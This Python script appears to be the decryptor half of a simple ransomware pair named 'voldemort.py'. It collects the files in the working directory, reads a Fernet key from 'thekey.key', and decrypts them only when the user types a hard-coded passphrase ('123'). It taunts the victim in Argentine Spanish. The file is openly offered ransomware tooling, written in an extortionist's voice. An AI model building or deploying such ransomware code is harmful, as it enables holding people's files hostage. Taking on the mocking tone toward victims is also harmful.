import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "123"

user_phrase = input("Pone la super mega clave secreta flaquito\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Linda pa, safaste por hoy cuchaste? Pero tampoco te hagas el vivo por que sos boleta de nuevo ")
else:
    print("JAJAJA EN SERIO PENSASTE QUE ERA ESA? Mamita, proba de vuelta dale")